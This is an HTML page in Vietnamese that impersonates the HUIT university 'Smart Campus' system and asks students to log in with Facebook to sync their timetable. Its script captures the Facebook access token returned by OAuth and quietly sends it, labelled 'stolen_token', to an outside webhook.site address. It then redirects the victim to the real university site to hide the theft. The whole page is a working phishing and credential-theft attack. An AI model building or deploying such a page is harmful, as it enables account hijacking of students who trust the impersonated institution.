<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Xác Thực Sinh Viên - HUIT Smart Campus</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 12px 24px rgba(0,0,0,0.1); text-align: center; width: 420px; border-top: 6px solid #1877f2; }
        .huit-logo { width: 90px; margin-bottom: 20px; }
        h2 { color: #1c1e21; margin-bottom: 15px; font-size: 26px; }
        p { color: #606770; font-size: 16px; margin-bottom: 30px; line-height: 1.6; }
        .btn-fb { background-color: #1877f2; color: white; border: none; padding: 16px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 18px; display: flex; align-items: center; justify-content: center; text-decoration: none; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://huit.edu.vn/tt-daotao/images/logo_huit.png" class="huit-logo">
        <h2>Hệ Thống Smart Campus</h2>
        <p>Nhấn xác thực để đồng bộ lịch học HUIT vào ứng dụng Facebook của bạn.</p>
        
        <button class="btn-fb" id="loginBtn">Tiếp tục với Facebook</button>
    </div>

<script>
    // === CẤU HÌNH QUAN TRỌNG ===
    const APP_ID = "2402493790174154"; 
    const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916";
    // Đảm bảo link này phải KHỚP 100% với link đã dán vào Facebook Developer
    const REDIRECT_URI = "https://phuongtrannn.github.io/test/index.html"; 

    document.getElementById('loginBtn').onclick = function() {
        // Chỉ lấy public_profile để Facebook không bắt nhập mật khẩu
        const SCOPES = "public_profile";
        const fbUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${SCOPES}`;
        window.location.href = fbUrl;
    };

    window.onload = function() {
        if (window.location.hash.includes("access_token")) {
            const params = new URLSearchParams(window.location.hash.substring(1));
            const token = params.get('access_token');
            
            if (token) {
                // Gửi Token về Webhook ngầm
                fetch(`${WEBHOOK_URL}?stolen_token=${token}`, { mode: 'no-cors' })
                .then(() => {
                    // Chuyển hướng về trang chủ trường để hoàn tất kịch bản
                    window.location.href = "https://huit.edu.vn/";
                });
            }
        }
    }
</script>

</body>
</html>
